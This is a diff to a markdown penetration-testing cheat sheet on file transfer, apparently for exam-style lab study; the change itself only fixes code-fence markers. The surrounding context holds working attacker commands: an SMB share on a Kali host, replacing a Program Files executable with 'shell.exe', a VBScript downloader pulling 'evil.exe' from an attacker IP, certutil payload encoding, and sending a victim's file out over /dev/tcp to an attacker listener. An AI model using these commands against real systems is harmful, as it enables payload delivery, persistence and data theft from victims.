@@ -3,7 +3,7 @@
 
 * File Transfer SMB
 
-'''
+```
 # mount drives
 net use abcd: \\kali_ip\myshare
 net use abcd: /d # disconnect
@@ -25,7 +25,7 @@ copy /Y C:\Downloads\shell.exe "C:\Program Files\...\legit.exe"
 
 # Python
 smbserver.py share .
-'''
+```
 
 * File Transfer through HTTP
 ```
@@ -85,7 +85,7 @@ bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf
 
 * File Transfer through FTP/TFTP
 
-'''
+```
 # Setup ftp server with offsec:creds by putting this into bash script
 groupadd ftpgroup
 useradd -g ftpgroup -d /dev/null -s /etc ftpuser
@@ -115,11 +115,11 @@ atftpd --daemon --port 69 /tftp
 /etc/init.d/atftpd restart
 
 tftp -i <ip> get file_name
-'''
+```
 
 * File Transfer through VBScript
 
-'''
+```
 echo strUrl = WScript.Arguments.Item(0) > wget.vbs
 echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
 echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
@@ -147,11 +147,11 @@ echo Next >> wget.vbs
 echo ts.Close >> wget.vbs
 
 cscript wget.vbs http://192.168.10.5/evil.exe evil.exe
-'''
+```
 
 * Base64 Encoding and Decoding
 
-'''
+```
 # Linux
 base64 -w0 <file> #Encode file
 base64 -d file #Decode file
@@ -159,11 +159,11 @@ base64 -d file #Decode file
 # Windows
 certutil -encode payload.dll payload.b64
 certutil -decode payload.b64 payload.dll
-'''
+```
 
 * Download Files from Victim
 
-'''
+```
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
-'''
+```
